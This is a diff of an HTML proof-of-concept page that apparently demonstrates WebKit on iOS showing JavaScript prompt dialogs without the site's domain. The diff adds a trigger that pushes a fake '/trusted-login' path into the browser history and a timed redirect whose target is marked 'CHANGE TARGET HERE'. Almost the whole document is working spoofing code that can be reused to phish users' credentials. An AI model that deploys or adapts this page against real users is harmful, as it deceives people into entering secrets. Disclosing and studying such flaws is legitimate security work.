@@ -1,40 +1,115 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>iOS JS Dialog PoC</title>
+<meta charset="utf-8">
+<title>iOS JS Dialog Redirect PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,system-ui;
+  background:#f5f5f7;
+}
+
+button {
+  margin:6px;
+  font-size:14px;
+  padding:8px 12px;
+}
+
+#panel {
+  display:none;
+  max-width:520px;
+  margin:60px auto;
+  background:#fff;
+  padding:24px;
+  border-radius:16px;
+  box-shadow:0 20px 60px rgba(0,0,0,.2);
+}
+
+h2 { text-align:center; margin-bottom:6px; }
+.sub { text-align:center; color:#666; margin-bottom:20px; }
+
+iframe {
+  width:100%;
+  height:120px;
+  border:1px solid #ccc;
+  border-radius:8px;
+  margin-top:12px;
+}
+</style>
 </head>
+
 <body>
 
-<h2>iOS JavaScript Dialog PoC (WebKit)</h2>
+<div style="text-align:center">
+  <button id="trigger">Start PoC</button>
+</div>
 
-<button onclick="topPrompt()">Top Window Prompt</button>
-<button onclick="iframePrompt()">Iframe Prompt</button>
-<button onclick="window0Prompt()">window[0] Prompt</button>
+<div id="panel">
+  <h2>iOS JavaScript Dialog PoC</h2>
+  <div class="sub">
+    Redirect + JS Dialog (WebKit)
+  </div>
 
-<hr>
+  <button onclick="topPrompt()">Top Window Prompt</button>
+  <button onclick="iframePrompt()">Iframe Prompt</button>
+  <button onclick="window0Prompt()">window[0] Prompt</button>
 
-<iframe id="xframe"
-  srcdoc="
-    <script>
-      function iframeFire() {
-        prompt('iframe: no domain shown');
-      }
-    </script>
-    <button onclick='iframeFire()'>Iframe Fire</button>
-  "
-  style="width:100%;height:120px;border:1px solid black;">
-</iframe>
+  <hr>
+
+  <iframe id="xframe"
+    srcdoc="
+      <script>
+        function iframeFire() {
+          prompt('iframe: no domain shown');
+        }
+      </script>
+      <button onclick='iframeFire()'>
+        Iframe Prompt
+      </button>
+    ">
+  </iframe>
+</div>
 
 <script>
+const panel = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+
+/* ======================
+   TRIGGER + FAKE PATH
+====================== */
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted-login');
+  panel.style.display = 'block';
+};
+
+/* ======================
+   REDIRECT AFTER LOAD
+====================== */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        // 🔴 CHANGE TARGET HERE
+        location.href = 'https://google.com:90';
+      }, 120);
+    });
+  });
+});
+
+/* ======================
+   JS DIALOG PoC
+====================== */
 function topPrompt() {
   prompt('top window: no domain shown');
 }
 
 function iframePrompt() {
-  document.getElementById('xframe').contentWindow.prompt(
-    'iframe via parent: no domain shown'
-  );
+  document.getElementById('xframe')
+    .contentWindow
+    .prompt('iframe via parent: no domain shown');
 }
 
 function window0Prompt() {
